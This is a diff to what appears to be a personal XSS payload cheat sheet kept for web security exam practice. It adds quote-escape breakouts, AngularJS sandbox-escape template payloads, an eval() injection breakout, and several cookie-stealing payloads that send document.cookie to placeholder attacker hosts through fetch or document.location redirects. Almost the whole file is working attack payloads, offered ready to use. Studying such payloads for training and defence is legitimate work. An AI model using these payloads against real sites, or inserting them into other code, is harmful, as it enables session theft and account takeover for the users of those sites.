@@ -25,7 +25,7 @@
 
 - [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
 - [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md)
-- [3]()
+- [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md)
 - [4]()
 
 
@@ -60,8 +60,19 @@ Repeat the same procedure with the target victim
 <img src=x onerror="#00000000000058;alert(1)">
 <script src="http://<IP>/foo"></script>
 ' - alert(1) - '
+\' - alert(1) -'
+\' - alert(1) //
 ' + alert(1) + '
 javascript:alert(0)
+
+
+//angularJS
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+{{1+1}}
+
 
 ```
 
@@ -73,13 +84,25 @@ javascript:alert(0)
 
 <img src=0 onerror="fetch('http://<IP>/?cookie='+btoa(document.cookie))">
 
+<iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>
+
 <iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>
 
 <script>fetch(`https://<BURP-COLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 
 
+// angularJS
+{{$on.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
+{{$eval.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
+{{constructor.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
 
+
+// json format in response injected in eval() without JSON.parse == string
+// eval() function it's a dangerous function that takes a string and execute it as javascript code
+// the server scape " with \ so scape with another \ close } and comment with //
+// adapt the payload in the exam depending of the parser
+\"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
 
 
 
@@ -140,7 +163,9 @@ req2.send(response);
 \'<script>alert(1)</script>
 // -> escape \ with other \ and escape ' with \
 \\'<script>alert(1)</script>
-// -> 
+// -> escape ' with \ + comment the rest of the js code with //
+\' - alert(1) // 
+// ->  
 </script><script>alert(1)</script>
 
 ```
